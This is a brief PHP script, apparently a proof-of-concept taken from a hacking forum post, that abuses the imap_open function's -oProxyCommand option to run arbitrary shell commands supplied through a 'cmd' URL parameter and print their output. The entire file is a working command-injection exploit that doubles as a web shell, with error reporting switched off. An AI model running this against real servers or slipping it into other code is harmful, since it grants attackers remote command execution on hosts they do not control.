<?php
# https://antichat.com/threads/463395/#post-4254681
# # echo '1234567890'>/tmp/test0001

error_reporting(0);
if (!function_exists('imap_open')) {
	die("no imap_open function!");
}
$server = "x -oProxyCommand=echo\t" . base64_encode($_GET['cmd'] . ">/tmp/cmd_result") . "|base64\t-d|sh}";
imap_open('{' . $server . ':143/imap}INBOX', '', ''); // or var_dump("\n\nError: ".imap_last_error());
echo file_get_contents("/tmp/cmd_result");